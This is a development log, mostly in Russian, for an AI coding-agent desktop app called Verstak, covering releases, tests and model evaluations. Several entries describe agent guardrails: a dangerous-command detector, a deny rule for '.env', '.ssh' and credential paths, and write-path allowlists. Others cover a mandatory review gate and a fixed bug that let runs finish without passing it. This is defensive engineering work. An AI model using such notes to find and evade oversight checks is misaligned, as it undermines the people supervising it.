> **1.8.9 RC sprint (08.07, local full gate PASS).** Закрыта связка 1.8.8 + 1.8.9 как кодовый release-candidate: security regression pack (`SEC-01..08`), deterministic dangerous-command detector, smart-approval seed, managed worktree lifecycle v1 и background process manager v1. Проверки: `npm run test:security` — 7 files / 24 tests pass; targeted `dangerous-commands`, `smart-approve`, `worktree-lifecycle`, `worktree-status`, `process-registry`, `process-tools` — 6 files / 69 tests pass; `npm run type` — pass; `npm run test:fast` — 280 files pass / 1 skipped, 2239 tests pass / 7 skipped; `npm run build` — pass; `npm run dist:win` — pass. При первом общем прогоне `tests/scripts/eval-cheap-models.test.ts` поймал timeout-флейк на 5s, отдельный rerun файла прошёл 2/2; тесту добавлен локальный 20s timeout, повторный общий прогон зелёный. Артефакты: `Verstak-Setup-1.8.9-x64.exe` 360,360,483 B, `Verstak-Portable-1.8.9-x64.exe` 209,565,808 B, `latest.yml` version 1.8.9.

> **Skill Governance UI grouping (08.07, local PASS).** Skills view теперь не плоская витрина: активные скиллы сгруппированы по provenance (`built-in` / `user` / `server`), показывают usage badges, дают команду `Архив`, а archived-записи показываются отдельным блоком с `Вернуть`. Это подключает уже сделанные `skill_usage`, archive/restore IPC и registry filter к реальному UI без отдельного большого Settings refactor. Проверки: `npm run type` pass, targeted SG UI-adjacent suite 9/9 pass, `npm run build` pass, `npm run test:fast` 2231 pass / 7 skipped.

> **Skill Governance archive (08.07, local PASS).** Закрыт компактный блок SG-03/SG-04: built-in skills больше не предполагают физическое удаление, archive работает через `skill_usage.state='archived'`, registry фильтрует archived skills из `list/get`, локальные `~/.verstak/skills/*.md` переносятся в `.archive/`, restore возвращает matching markdown обратно. IPC/bridge/types получили `skills.archive` / `skills.restore`; Settings UI-кнопки остаются отдельным маленьким follow-up. Проверки: `npm run type` pass, targeted SG archive suite 28/28 pass, `npm run test:fast` 2231 pass / 7 skipped, `npm run build` pass.

> **Skill Governance seed (08.07, local PASS).** Закрыт компактный старт SG-01/SG-02: зафиксирована карта текущей skill-системы в `docs/SKILL_GOVERNANCE_AUDIT_2026-07-08.md`, добавлена append-only миграция 40 `skill_usage`, storage-фасад `electron/storage/skill-usage.ts`, IPC `skills:usage` / `skills:record-use`, и best-effort счётчик активаций из `setActiveSkill(id)`. `Skill.source` остаётся текущим provenance-полем для built-in/user/server; protected/archive/UI grouping остаются следующими SG-03..07. Проверки: `npm run type` pass, targeted SG suite 24/24 pass, `npm run test:fast` 2227 pass / 7 skipped, `npm run build` pass. Первый общий `test:fast` поймал timeout-флейк `tests/scripts/eval-cheap-models.test.ts`, отдельный rerun файла 2/2 pass, повторный общий прогон зелёный.

> **Competitive RUN hardening (08.07, local PASS).** Закрыт компактный блок из master plan: lifecycle generation stale-reject, per-chat/help lane queue, terminal run events, headless trace parity. `agent_runs` получил generation через миграцию 39; SendRegistry хранит generation по chat/help lane и игнорирует stale owners; повторный send в тот же чат ставится в очередь; `agentRuns.finish()` пишет один terminal timeline event; `scripts/verstak-cli.mjs --trace-json` теперь выдаёт lifecycle/counter/status/duration/error поля без секретов. Проверки: `npm run type` pass, targeted RUN suite 66/66 pass, `npm run test:fast` 2225 pass / 7 skipped, `npm run build` pass.

> **1.8.8 settings/agent-permissions sprint (06.07, local PASS).** Добавлен управляемый список внешних папок для записи: Settings → `Что разрешено` → `Разрешённые внешние папки для записи`. Агент по-прежнему может читать явные абсолютные пути как read-only context; писать можно внутри проекта, в Downloads и теперь в явно разрешённые папки. `write_file`/`apply_patch` получили общий `allowedWriteRoots` runtime-параметр, основной agent loop, headless run, fallback и JSON tool-mode читают настройку `allowed_write_roots`; symlink escape и secret-path guard остаются включены. Проверки: `npx vitest run tests/ai/path-policy.test.ts tests/ai/allowed-write-roots.test.ts` 24/24 pass, `npm run type` pass, `npm run test:fast` 2108 pass / 7 skipped, `npm run build` pass. Первый общий прогон ловил timeout-флейк в `tests/autoupdate-state.test.ts`, отдельный rerun этого файла 8/8 pass, повторный общий прогон зелёный.

> **v1.8 audit/foundation (04.07, in progress).** Исправлен product-блокер внешнего контекста: `read_file`/`list_directory` теперь принимают явный абсолютный путь как read-only context без переключения проекта, при этом write/apply/run/git/undo остаются внутри project root, а `.env`/`.ssh`/keys/credentials блокируются. Live-check: активный проект Verstak прочитал внешний `C:\Users\Pavel\Progetc\_artifacts\Sistems\skills\pavel-dev-hq\SKILL.md` (7481 символ). Внешний китайский v1.8 sprint и внутренние планы сверены; рабочий scope записан в `docs/VERSTAK_1.8_AUDIT_PLAN.md`: брать model-registry foundation, Proof PDF+Telegram, Agency/Pipeline visibility, release docs; отложить Remote Pulse full control, full headless agency parity и большой `ai.ts` refactor. **Stage 14:** добавлен `electron/ai/model-registry.ts`, `kimi-k2.7-code` получил явный 256K context limit, Moonshot Settings синхронизирован на `kimi-k2.7-code` как default, UI-каталог цен показывает Kimi K2.7 как priced API model; targeted registry/catalog suite 12/12 pass. **Stage 15:** добавлены `proof:export-pdf` и `proof:send-telegram`, preload/types обновлены, Telegram `send_document` теперь умеет отправлять локальный `document_path` multipart; targeted Proof/Telegram suite 14/14 pass. **Stage 16:** в Runs panel рядом с Proof Pack появились действия `PDF` и `Telegram`, чтобы delivery был виден без отдельного экрана; `npm run type` pass.

> **Post-release smoke 1.8.7 ЗАКРЫТ (06.07).** Локальная установка поверх `1.8.6` прошла после закрытия приложения: installed `app.asar` = `1.8.7`, build/installed bundle совпадают. Live site `https://agi-iri.ru/verstak/` обновлён: все кнопки `Скачать Core` теперь имеют прямой fallback на `https://github.com/frolofpavel/verstak/releases/download/v1.8.7/Verstak-Setup-1.8.7-x64.exe`; перед заменой prod-файла создан серверный backup `index.html.bak-20260706-1821`, правка закоммичена в `agi-iri` (`114fbd1`). Direct setup link returns `200 OK` with `Content-Length: 360330032`; public `latest.yml` returns `version: 1.8.7`. UI smoke: `npm run smoke:agency-ui` pass (fake local OpenAI-compatible gateway, no secrets, no real network), full loop Plan → Patch → Verify → Review → Proof; Settings/ModelPicker bundle contains `Найти CLI`, `Подключённые модели`, `gg-models-row-policy`, `gg-mp-row-policy`, `Урезанный контроль`.

> **Релиз 1.8.7 ВЫКАЧЕН (06.07, tag `v1.8.7`).** Подтянуты правки Ильи из `filatov/codex/verstak-1.8.6-ui-model-fixes` и объединены с текущей model policy: ModelPicker/Settings снова показывают расширенные карточки моделей, транспорт провайдера, состояние подключения и подсказки agent-mode; обновлены метаданные gateway/Grok/DeepSeek/Qwen/Kimi/GLM/MiniMax, меню инструментов композера, worktree bar, восстановление окна и Shell Atelier стили. Checks: `npm run type`, `npm run test:fast` (2102 / 7 skipped), `npm run build`, `npm run dist:win`; clean temp installer smoke установил `app.asar` версии `1.8.7`. Artifacts uploaded: `Verstak-Setup-1.8.7-x64.exe` 360,330,032 B, `Verstak-Portable-1.8.7-x64.exe` 209,549,081 B, `latest.yml` 351 B. Public check: GitHub Release assets `uploaded`, setup direct link returns `200 OK`, public `latest.yml` returns `version: 1.8.7`.

> **Релиз 1.8.6 ВЫКАЧЕН (06.07, tag `v1.8.6`).** Hotfix после install smoke `1.8.5`: Windows installer больше не читает payload `resources/app.asar` через Electron virtual asar FS; для проверки/копирования payload используется `original-fs`. Дополнительно исправлен NSIS wrapper quoting: скачиваемый self-extract `Verstak-Setup-1.8.6-x64.exe` теперь корректно передаёт `--silent --install-dir` во внутренний installer. Это закрывает false-fail `Повреждён архив приложения: пустой файл resources\app.asar` и silent wrapper exit `1`. Сайт `docs/index.html`: fallback-кнопка теперь ведёт напрямую на Setup `.exe`, а не на страницу Releases. Checks: `npm run type`, targeted installer tests, `npm run test:fast`, `npm run build`, `npm run dist:win`, self-extract silent install поверх локальной установленной копии (`LASTEXITCODE=0`). Блокер вне repo: `agi-iri.ru` с локальной машины 06.07 не резолвится (`remote name could not be resolved`), нужен DNS/hosting check.

> **Релиз 1.8.5 ВЫКАЧЕН (05.07, tag `v1.8.5`).** Version bumped `1.8.0 -> 1.8.5` in `package.json`/`package-lock.json`; added `CHANGELOG.md` entry and `docs/RELEASE-v1.8.5.md`. Release scope: grouped Settings navigation, explicit `Find CLI`, visible default model policy, Settings → `Правила`, saved-state footer, read-only external context, and safe explicit Downloads exports. Checks passed: `npm run type`, `npm run test:fast` (2102 passed / 7 skipped), `npm run build`, `npm run dist:win`. Artifacts verified locally: `Verstak-Setup-1.8.5-x64.exe` 360,330,895 B, `Verstak-Portable-1.8.5-x64.exe` 209,545,905 B, `latest.yml` 351 B with version/path/size/sha512 for setup.

> **Релиз 1.8.0 ВЫКАЧЕН (04.07, `b5ec546`, tag `v1.8.0`, GitHub Release id=348983461).** Version bumped `1.6.3 -> 1.8.0` in `package.json`/`package-lock.json`; added `CHANGELOG.md` and `docs/MIGRATION-v1.8.md`. Checks passed: `npm run type`, `npm run test:fast` (2093 passed / 7 skipped), `npm run build`, `npm run dist:win`. Artifacts verified and uploaded: `Verstak-Setup-1.8.0-x64.exe` 343.6 MB, `Verstak-Portable-1.8.0-x64.exe` 199.8 MB, `latest.yml` 351 B. Public GitHub check: `releases/latest` = `v1.8.0`, all 3 assets `uploaded`, public `latest.yml` returns 200 and matches local version/path/size/sha512.

> **Post-1.8 settings hardening (05.07, local PASS).** В Settings → Провайдеры добавлена явная кнопка `Найти CLI`: она заново проверяет Claude Code / Gemini CLI / Grok Build / Codex CLI / совместимые CLI на машине, показывает найденные CLI даже при пустом результате и даёт быстрый `Логин` для поддерживаемых провайдеров. В Settings → Модели и ModelPicker вынесены видимые правила default model policy: Kimi K2.7 Code = основная, DeepSeek Chat = запасная, Qwen = allowed/not default, fast/reasoner/GLM/MiniMax = не agent-mode. Левая навигация Settings перегруппирована в смысловые блоки (`Приложение`, `AI и модели`, `Интеграции`, `Контроль агента`, `Проектные данные`) и получила поиск по разделам. Проверки: `npm run type`, targeted model-catalog suite 5/5, `npm run test:fast` 2096 passed / 7 skipped, `npm run build` pass.

> **Post-1.8 agent freedom hardening (05.07, local PASS).** Явный абсолютный путь на чтение остаётся разрешённым как read-only external context через `resolveReadOnlyPath`; запись получила безопасный коридор для пользовательских exports: относительные пути как раньше остаются внутри project root, а абсолютные `write_file`/`apply_patch` теперь разрешены только внутри пользовательского `Downloads` с symlink-escape проверкой. Внешние записи не попадают в undo/project-map активного проекта, но остаются видимыми в timeline. Секретные пути (`.env`, `.ssh`, keys, credentials) по-прежнему блокируются. Проверки: `npm run type`, targeted path/write suite 25/25, `npm run test:fast` 2101 passed / 7 skipped, `npm run build` pass.

> **1.8.5 settings mechanics sprint (05.07, local PASS).** Добавлена вкладка Settings → `Правила`: показывает глобальный `~/.verstak/RULES.md`, проектные кандидаты `AGENTS.md` → `CLAUDE.md` → `GEMINI.md` → `.verstak/RULES.md`, активный слой, размер/статус и даёт безопасные действия `Создать правила проекта`, `Открыть`, `Папка`. IPC ограничен зарегистрированными проектами и известными rules-кандидатами. Footer Settings получил явный статус сохранения: `Есть несохранённые изменения` / `Сохраняю…` / `Сохранено`; мгновенно применяемые настройки остаются отдельным поведением. Проверки: `npm run type`, targeted user-layer/path/write suite 32/32, `npm run test:fast` 2102 passed / 7 skipped, `npm run build` pass.

> **Post-1.8 hardening (05.07, deployed).** Gateway preset remap shipped through `agi-iri` source + production `/opt/iri-gateway`: `verstak/balanced` + `verstak/coder` → `kimi-k2.7-code` (`moonshot/kimi-k2.7-code`), `verstak/fast` → `deepseek-chat`. Server restart passed `/health` (`models_count=258`), server runtime `public_verstak_presets()` verified target models, public `/v1/models` includes all 3 presets. Runs panel now shows a compact Agency pipeline rail per run: Plan → Patch → Verify → Review → Proof, derived from actual run events.

> **Релиз 1.6.3 — Agency Outcome Loop hardening (04.07, release bump).** Версия поднята после Stage 11/12 и Agency full-loop smoke: headless/gateway parity, cheap model policy, обязательный review gate перед Proof Pack, proof artifacts `.json/.html/.md`, delegate gateway base-url preservation и полный smoke `create_plan → approval → patch → attest_verification → review_before_commit → Verify → Review → Proof Pack`. Это новый patch-release поверх опубликованного 1.6.2, чтобы latest/update metadata честно отражали свежий код и installer не маскировал новые изменения под старый номер.

> **Релиз 1.6.2 ВЫКАЧЕН (04.07, `7bfa1f7`, tag `v1.6.2`, GitHub Release id=348874274).** Объединённый main с 1.5.50: skill/recipe layer, надёжность tool-calling (OpenAI-совм.), напоминания + crash-resume + панель прогонов (зона Ильи, мёрж), экспорт транскрипта, dedup-фикс activity-стрима. **Сделано:** version 1.6.1→1.6.2, changelog (источник `sync-verstak-changelog.cjs` + автоген `official-changelog.ts`, 55 версий), `npm run test` 2047✓, `dist:win` → Setup 343.6 МБ + Portable 199.8 МБ + `latest.yml`, `deploy:local` (Павел на 1.6.2), push main+tag, **GitHub Release опубликован** (все 3 ассета `uploaded`, `latest.yml`→1.6.2, sha512 сходится, проверено публичным API). Публикация — напрямую через GitHub API токеном из Git Credential Manager (`gh`/`GH_TOKEN` в среде нет). Авто-обновление у пользователей подхватит 1.6.2.

> **Этап 12 — Default Model Policy / Agent Routing (04.07, local PASS).** Результаты 45-run Stage 11 matrix превращены в runtime policy: добавлен `electron/ai/agent-model-policy.{json,ts}` с явными `agentMode`, roles, recipes, `toolMode`, alias/remap notes. **Дефолты:** provider `verstak-gateway`; coding/planner/reviewer → `kimi-k2.7-code`; coding fallback/fast-edit → `deepseek-chat`; `qwen3-coder` allowed/fallback, но не default для required-review bugfix; `verstak/fast`/`verstak/coder/fast` not recommended for agent mode; `verstak/balanced`/`verstak/coder/balanced` рекомендуются к remap на Kimi. **Routing:** Electron Gateway spec/default, Settings/Onboarding/ModelPicker, `smart-router`, `tier-router` и headless `verstak recipe run` теперь используют policy; явный user `--model` сохраняется и не блокируется. **CLI acceptance:** dry-run без `--provider/--model` даёт trace `verstak-gateway / kimi-k2.7-code`; dry-run с `--model qwen3-coder` сохраняет Qwen; `model_verstak_gateway=verstak/fast` в settings не становится recipe default. **Docs:** README, Gateway provider doc и cheap-eval summary обновлены; server-side Gateway remap оставлен отдельной задачей, если mapping живёт в другом repo. **Проверки:** `npm run type` зелёный; targeted policy/Gateway/router/CLI suite 42/42; `npm run test:fast` — 2072 passed / 7 skipped; secret values не логировались, тестовый ключ в CLI trace не попадает.

> **Verstak 1.7 — Agency Outcome Loop, рабочий срез (04.07, local PASS).** Существующий Pipeline усилен до сквозного agent workflow: UI entrypoint теперь запускает `agency` task, execute-промпт требует `attest_verification` и затем `review_before_commit`, после Verify добавлен отдельный шаг `Review`, а переход в Proof Pack разрешён только при timeline-событии `review_before_commit` со статусом pass marker `REVIEW GATE: ПРОЙДЕНО`. `review_before_commit` теперь пишет явный timeline/tool_call event, поэтому gate виден в Runs/Proof. Закрыт сценарный разрыв: если gate дожали follow-up send в том же чате, Review step и Proof Pack находят этот pass, но основной proof остаётся привязан к execute-run. Proof Pack расширен до `proof.json + proof.html + proof.md`, содержит блок `reviewGate` и редактирует строки через существующий secret scanner. **Проверки:** targeted pipeline/proof/review suite 74/74; `npm run type` зелёный; `npm run test:fast` — 2079 passed / 7 skipped; `npm run build` зелёный (только старые Vite dynamic-import warnings). **Ограничения:** Telegram delivery, PDF Proof Pack и headless parity для полного Agency UI-loop не трогались; gateway/provider слой не менялся.

> **Agency Outcome Loop full-loop smoke (04.07, PASS; supersedes UI-only note below).** `npm run smoke:agency-ui` теперь проверяет не только wizard/IPC, а полный локальный агентный путь через fake OpenAI-compatible Verstak Gateway без реальных ключей: `create_plan` → user approval → `apply_patch` → `attest_verification` (`node --test calc.test.mjs`) → `review_before_commit` с независимым delegate-reviewer → Verify → Review → Proof Pack. Smoke создаёт временный git-workspace с красным тестом `add(2,3)`, агент исправляет только `calc.mjs`, unrelated files не трогает, post-verify exit=0, proof files `.proof.json/.proof.html/.proof.md` появляются. Найдено и закрыто 2 runtime/UI gap: sub-agent/delegate теперь наследует `verstak_gateway_baseurl` для `verstak-gateway` (review gate не уходит мимо локального gateway/kill-switch), а Verify-banner читает verification по `agentRunId` через `latestByRunId`, чтобы зелёная кнопка Review появлялась для реального execute-run. Проверки: `npm run smoke:agency-ui` PASS; повторный `node scripts/smoke-agency-ui.mjs` PASS; `npm run type` PASS; `npm run test:fast` PASS (2079 passed / 7 skipped). Секреты не читались и не логировались; providerCall=`fake-local-openai-compatible`, realNetwork=false.

> **Agency Outcome Loop live UI smoke (04.07, historical UI-only PASS).** Добавлена воспроизводимая команда `npm run smoke:agency-ui`: она пересобирает native-модуль под Electron, собирает приложение, запускает собранный Electron в изолированном `--user-data-dir` и временном workspace без реальных ключей. Закрыт launch bug: главное `BrowserWindow` теперь удерживается сильной ссылкой до `closed`, иначе окно могло закрыться сборщиком мусора до smoke. В пустом чате добавлен видимый quick entrypoint `Agency task`; CDP-smoke подтвердил: кнопка видима и кликается, wizard открывается, цепочка `Brief → Plan → Execute → Verify → Review → Proof` видна, 3 поля brief есть, старт заблокирован до заполнения и включается после заполнения. Дополнительно smoke проверяет настоящий preload IPC/storage: `pipeline:start` создаёт `mode=agency`/`step=plan`, `pipeline:getActive` возвращает этот run, `pipeline:cancel` убирает его из активных. Этот блок оставлен как исторический срез; актуальный smoke выше уже нажимает Start и проходит весь агентный путь до Proof Pack.

> **Этап 11 — Cheap Model Eval Matrix + default model policy (04.07, live eval PASS).** Добавлен reproducible eval runner `scripts/eval-cheap-models.mjs`: генерирует 5 безопасных временных workspaces (`small-edit`, `bugfix`, `typescript-error`, `test-fix`, `review-before-commit`), гоняет настоящий `verstak recipe run` через `verstak-gateway`, снимает trace/diff/verify/review-gate метрики и пишет markdown+JSON отчёт. **Live matrix:** 45 строк через локальный GUI Gateway key из safeStorage (только in-memory env, значения ключей не печатались/не писались); `traceSecretLeak=0`, scan отчёта по key-паттернам clean. **Результаты:** `kimi-k2.7-code` (`moonshotai-kimi-k2`) — 5/5 strict pass и становится default coding/reviewer/planner; fallback coding — `deepseek-chat` (pass: `small-edit`/`bugfix`/`typescript-error`/`test-fix`, fail только standalone `review-before-commit`); `qwen3-coder` — 4/5, но bugfix fail-closed без gate; `verstak/coder` — 4/5, bugfix gate fail; current `verstak/fast` — 1/5 и не годится в agent mode; current `verstak/balanced` — 4/5, но slow и fail на `small-edit`; `deepseek-reasoner` not tested (`network-error`), `minimax-m1` not tested (`400`), `z-ai/glm-4.6` не годится для agent mode (1/5). **Policy:** `verstak/coder/fast` надо маппить на `deepseek-chat` или держать вне agent mode; `verstak/coder/balanced` — на `kimi-k2.7-code`; recipe map: `bugfix`/`test-fix`/`typescript-error`/`review-before-commit` → `kimi-k2.7-code`. **Артефакты:** `docs/cheap-model-eval-2026-07-04.md` + `.json`. **Найдено:** баг нового eval harness на Windows/кириллическом пути (`import.meta.url` нужно читать через `fileURLToPath`) — исправлен; runtime-багов headless recipe runner/gateway path не найдено. **Проверки:** `npm run type` зелёный; targeted `tests/scripts/eval-cheap-models.test.ts` 2/2; полный `npm run test:fast` — 2062 passed / 7 skipped.

> **Этап 10 — CLI Provider/Gateway Parity (04.07, `ccefb0b`→`8186e2a`, live-smoke PASS).** Headless CLI теперь знает `verstak-gateway`, `VERSTAK_GATEWAY_API_KEY`, `--provider-config` и порядок resolution: явные CLI args → named provider config (`.verstak/settings.json` / `~/.verstak/settings.json`) → settings/env fallback → понятная ошибка. Для gateway синхронизированы baseUrl/fallbackBaseUrl и модели `verstak/*`, старый env-provider path не сломан. **Проверки:** локально `npm run type` зелёный, `npm run test:fast` — 2060 passed / 7 skipped; targeted CLI suite 14/14 (`provider-config`, `recipe`, streaming tool-call name). На сервере `ailos178` smoke-ветка `smoke/cli-provider-gateway-parity` на `8186e2a`: `npm run type` зелёный, targeted CLI suite 14/14; полный Linux `test:fast` падает только на 3 старых Windows-path теста (`installer-paths`, `storage/projects`), не на Stage 10. **Live-smoke через Verstak Gateway:** локальный GUI key из safeStorage передавался на сервер только in-memory по SSH stdin, на диск не писался и не печатался; `cli doctor` увидел gateway source=`env`; `/v1/models` и chat probes приняли `deepseek-chat`, `qwen3-coder`, `kimi-k2.7-code`, `verstak/coder/fast/balanced`. `bugfix + deepseek-chat` и `bugfix + qwen3-coder` прошли через `provider=verstak-gateway` + `--provider-config`: baseline taken yes, first mutating tool `apply_patch`, `reviewGate=pass`, verify `npm run type`/`npm run test:fast` pass, внешний verify pass, diff только `calc.mjs: return a - b -> return a + b`, `unrelated.mjs` не тронут, secret leak no. **Вывод:** проблема предыдущего smoke была не в валидности ключа, а в том, что server headless env не видел GUI safeStorage key.

> **Этап 9 — Headless Recipe Runner / CLI parity (04.07, локально+server smoke, `379684d`→`d3a4551`→`444bbf0`).** CLI получил настоящий минимальный recipe entrypoint: `verstak recipe run --recipe <id> --provider <provider> --model <model> --workspace <path> --task "..."`, плюс `--max-turns`, `--trace-json`, `--dry-run`. **Сделано:** CLI грузит 6 built-in coding recipes, рендерит protocol тем же текстом, что GUI (`renderRecipeProtocol` parity закреплён тестом), прокидывает recipe protocol в system prompt и пишет machine-readable trace: provider/model, recipe id, tool calls, first mutating tool, baseline, verify commands, review gate, final status/failure reason. **Enforcement:** перед первым мутирующим tool-call (`write_file`/`apply_patch`/`edit_file`/`create_file`/`apply_diff`) снимается in-memory baseline для `verify.commands`; pre-existing red не блокирует, новые ошибки блокируют. Для `reviewer.required` финал без passed `review_before_commit` запрещён: один corrective nudge → затем fail-closed/non-zero exit; max-turns до gate тоже fail-closed. `review_before_commit` в CLI проверяет allowlist verify-команд, `git diff`, baseline-aware verify и возвращает pass marker только при зелёном результате. **Проверки:** targeted headless suite 8/8 зелёных (`tests/scripts/verstak-cli-recipe.test.ts`, `tests/scripts/verstak-cli-toolname.test.ts`): loads recipe, protocol parity с GUI, baseline before first mutation, required review fail-closed, passed gate allows final, dangerous command blocked, streaming tool-call name regression. Pre-commit hook прошёл `type-check` + полный `test:fast`; локально перед smoke: `npm run type` зелёный, `npm run test:fast` — 2054 passed / 7 skipped. **Live-smoke PASS на сервере `ailos178` через временную ветку `smoke/headless-recipe-runner`, main до smoke не пушился, секреты не печатались/не писались на диск:** ключи `DEEPSEEK_API_KEY`/`OPENROUTER_API_KEY`/`QWEN_API_KEY`/`MOONSHOT_API_KEY` логировались только как `present: yes`; `deepseek/deepseek-chat + bugfix` прошёл (baseline taken yes, first mutating tool `apply_patch`, verify pass, review gate pass, diff только `calc.mjs`, trace secret leak no); `openrouter/qwen/qwen3-coder + bugfix` прошёл с теми же критериями; `review-before-commit + reviewer.required` прошёл (protocol rendered yes, `review_before_commit` вызван 1 раз, gate pass, final success). **Ограничения:** CLI runner минимальный, без нового UI и без benchmark harness; built-in recipe definitions в CLI пока зеркалятся из GUI, но drift protocol/steps/verify/reviewer ловится тестом; `verstak-gateway`/`verstak/*` уже есть в Electron GUI provider layer, но headless CLI в этом этапе работает по текущему `--help` contract (`deepseek`/`openrouter` и др.) и отдельный `verstak-gateway` CLI-provider не добавлялся из-за hard constraint “не добавлять provider”.

> **Этап 7 — GUI-dogfood recipe enforcement на живой дешёвой модели + 2 фикса (04.07, в main+push, `e2f9922`).** Живая проверка Этапа 6 (P1 авто-baseline + P2 mandatory review gate) на `deepseek-chat` в git-песочнице (`Downloads/verstak-dogfood`: багованный `sum.mjs`, падающий `node --test`, recipe `/bugfix`). **6 прогонов, все три защиты доказаны по логам `agent_run_events`:** P1 baseline снимается перед первой правкой (событие `verify | recipe baseline | npm run type: exit 0; test:fast: exit 1` — pre-existing red не вешается на модель); P2 nudge форсит `review_before_commit` перед финалом (событие `tool-blocked` «вызови гейт»); fail-closed реально стопит (прогон `d0e88896` → `status=failed` при несоблюдении). **2 найденных и закрытых дефекта (`e2f9922`):** (1) **max-turns bypass** — при исчерпании бюджета ходов с активным `reviewer.required` и непройденным гейтом прогон помечался `done`; теперь `exitReason='error'` → `failed` (fail-closed), «+ходы» для продолжения сохранены (`ipc/ai.ts` перед `turns-exhausted`); (2) **allowlist-петля** — `review-gate` отбивал `node --check`/`node --test` (verify-примитивы вне allowlist) → модель зацикливалась «вызови гейт → гейт отбил verify → ходы кончились»; добавлен паттерн `/^node\s+--(check|test)\b/` в `isAllowedVerifyCommand` (произвольный `node <script>` по-прежнему заблокирован). **Проверки:** `npm run type` зелёный · `tests/ai/review-gate.test.ts` 41/41 (+кейсы node-allow + node-deny) · вся `tests/ai` 1101 passed. Pre-commit hook (type+тесты) прошёл. **Ложная тревога (закрыта):** «утечка GitHub-токена в резюме» — падение `session-summary.test.ts` оказалось ABI-шумом sqlite (`NODE_MODULE_VERSION 143 vs 137`, dev держал `.node`), а не багом — `session-summary.ts:64` уже редактирует через `scanText`. **Открытый design-хвост (не критичен):** реальный `review_before_commit` требует git-репо (`git diff` пуст в non-git → gate fail) — задокументировано; в песочнице обошли `git init`. **Найдены (не мои, из мёржа Ильи, на отдельную задачу):** дубли React-key `..._attest_verification` + `Maximum update depth exceeded` (зацикленный ре-рендер) в dev-логе.

> **Этап 6 — recipe enforcement: авто-baseline + mandatory review gate (04.07, в main, `30e4eab`→`085435c`).** Recipe с `verify`/`reviewer.required` больше не зависит от дисциплины модели в двух местах (закрыты product-gap Этапа 5). **P1 авто-baseline (`30e4eab`):** для active recipe с `verify.commands` runtime лениво снимает baseline verify ДО первого мутирующего tool-call (`write_file`/`apply_patch`/`edit_file`) — in-memory per-run, без БД/диска. `review_before_commit` берёт этот baseline через `ctx.getRecipeBaseline()`, если модель не передала его аргументом. fail-closed: не-allowlisted/policy-blocked/упавшие команды не попадают в baseline → их отсутствие делает gate строгим (нет false-pass); allowlist + command-policy не обходятся. **P2 mandatory gate (`085435c`):** при `reviewer.required` runtime отслеживает успешный `review_before_commit` (маркер `REVIEW GATE: ПРОЙДЕНО` в результате tool-вызова, не текстовая имитация). Попытка финала без пройденного gate → один corrective nudge (`decideReviewGate`, bounded 1) с требованием вызвать тул; если модель снова не зовёт → fail-closed остановка с понятной причиной. Enforcement ТОЛЬКО для active recipe — обычные skills/chat/agent runs не задеты (проверено тестом). Точки внедрения: `ipc/ai.ts` (run-контекст `AgentRunContext.recipe`, снапшот перед dispatch, enforcement в обеих точках финала), `ai/review-gate.ts` (чистые хелперы `snapshotVerifyBaseline`/`decideReviewGate`/`isReviewGatePassResult`/`isMutatingToolName`), `tool-handlers/{shared,review-before-commit}.ts` (baseline reuse). Agent loop не переписан, delegate/reviewer-override recipe не наследуют (нет рекурсивного enforcement). **Проверки:** `npm run type` зелёный · `npm run test:fast` — 2041 passed / 7 skipped / 0 failed (+21 тест: P1 snapshot/mutating + P2 decide/marker/messages). **Честные ограничения:** baseline снимается «перед первым мутирующим tool» (не в самый старт run) — минимальный безопасный вариант; покрыт набор file-edit/patch тулз, не `run_command`-as-mutating; enforcement — nudge→fail-closed stop (runtime сам gate не вызывает — по ТЗ минимально безопасный путь); recipe с reviewer.required без изменений (пустой diff) тоже упрётся в gate-fail (осознанно, coding-рецепт ждёт правок); loop-level поведение покрыто через unit чистых решателей, не полный e2e agent-loop. **P3 (reviewer/fixer на другой модели) и P4 (headless recipe-runner) — НЕ делались (вне scope).**

> **Этап 5 — recipe-runtime e2e на дешёвых моделях (04.07, в main, `eba5a46`).** Валидация, что recipe/runtime-слой работает как рельсы. **Детерминированный слой (суть рельсов) — 26/26 зелёных на реальных модулях:** suggestion (5 сценариев+приоритет), injection (6 протоколов несут read_set/steps/verify/stop/reviewer), gate fail-closed (invalid/empty/confidence<0.7/not-inspected/verify-not-run), baseline (pre-existing не блокирует, новая блокирует, нет false-pass). **Live-прокси через CLI (серверные ключи agi-iri, sandbox bugfix):** ✅ Gemini-3.5-flash, DeepSeek-chat, DeepSeek-reasoner, Kimi-K2, GLM-4.6, MiniMax-M1, Qwen3-coder — ВСЕ прошли по протоколу (inspect→read→patch→verify=PASS→summary, минимальный diff, `unrelated.mjs` не тронут). ❌ Qwen-2.5-coder-32b — нет tool-use через OpenRouter (404). ❌ Groq — HTTP 403 geo-block (РФ). **Найденный и исправленный баг:** `verstak-cli.mjs` аккумулировал имя streaming tool-call через `+=` → «read_fileread_file» → DeepSeek/Qwen сдавались («tools unavailable»); фикс — присваивание (как GUI-парсер `openai-compat.ts:194`) + регрессия-тест (мок ollama-эндпоинта). **Архитектурная находка:** recipe/gate/baseline живут ТОЛЬКО в Electron-loop; CLI — отдельный runtime без рецептов → «настоящий» headless e2e рецептов невозможен без GUI (harness = стоп-условие, не делал). **3 гипотезы (по фактам):** (1) авто-снапшот baseline на старте — ДА, нужен (сейчас агент передаёт аргументом, легко забыть); (2) enforce `review_before_commit` — ДА, дешёвые модели не зовут gate сами, нужен recipe-level принудительный финальный шаг; (3) reviewer/fixer на другой модели — желательно (свежий контекст ≠ иная слепая зона). **Следующий кодовый этап — по подтверждению Павла.**

> **Skill/Recipe Layer for coding (04.07, Этап 4, в main, не зарелизено, `8d51daf`→`1aeede3`).** Завершён. Recipe-слой поверх skills: дешёвые модели работают по жёсткому workflow-протоколу `read_set → small patch → verify → review gate → bounded autofix`, а не в свободном агентном режиме. **A frontmatter** (`8d51daf`) — `RecipeSpec`/`RecipeStep`/`RecipeCompensation` в skill-типах + fail-soft `parseRecipe`. **B built-in** (`3d3a76b`) — 6 inline recipe-skills: `small-edit`/`typescript-error`/`bugfix`/`test-fix`/`refactor-safe`/`review-before-commit`, каждый с trigger/read_set/steps/verify/reviewer/stop. **C injection** (`84ac7ef`) — `renderRecipeProtocol` инжектит протокол активного recipe в system prompt (main-side, через `AiSendOverrides.recipe`; обычные skills не задеты). **D suggestion** (`29ae326`) — детерминированный `suggestRecipe` по ключевым словам (tsc→typescript-error, vitest→test-fix, …), только chip, без auto-run. **F baseline-aware verify** (`4743874`) — `baseline-verify.ts`: снимок verify до/после, сравнение по нормализованным сигнатурам, pre-existing red НЕ блокирует, новые ошибки — блокируют. **E review gate** (`1aeede3`) — tool `review_before_commit`: verify (allowlist, fail-closed) → 